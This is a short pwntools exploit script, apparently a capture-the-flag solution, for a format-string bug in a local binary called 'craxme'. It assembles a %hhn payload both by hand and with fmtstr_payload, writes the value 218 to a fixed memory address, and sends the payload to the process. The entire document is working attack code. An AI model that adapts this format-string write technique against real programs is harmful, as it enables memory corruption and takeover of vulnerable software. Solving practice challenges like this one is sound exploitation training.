from pwn import *

p = process("./craxme")

offset = 7
magic_addr = 0x804A038
target_num_1 = 218

p.recvuntil(":")

def fmt(prev , target):
	if prev < target:
		result = target - prev
		return "%" + str(result)  + "c"
	elif prev == target:
		return ""
	else:
		# result = 256 - (prev - target)
		result = 256 + target - prev
		return "%" + str(result) + "c"
payload = p32(magic_addr) + p32(magic_addr + 1) + p32(magic_addr + 2) + p32(magic_addr + 3)
prev = len(payload)
for i in range(4):
	target = (target_num_1 >> (i * 8)) & 0xff 
	payload += fmt(prev , target) + "%" + str(offset + i) + "$hhn"
	prev = target
print payload
print "__________"
payload = fmtstr_payload(offset , {magic_addr : target_num_1} )
print payload
print "__________"
p.send(payload)
print p.recv()
# p.interactive()
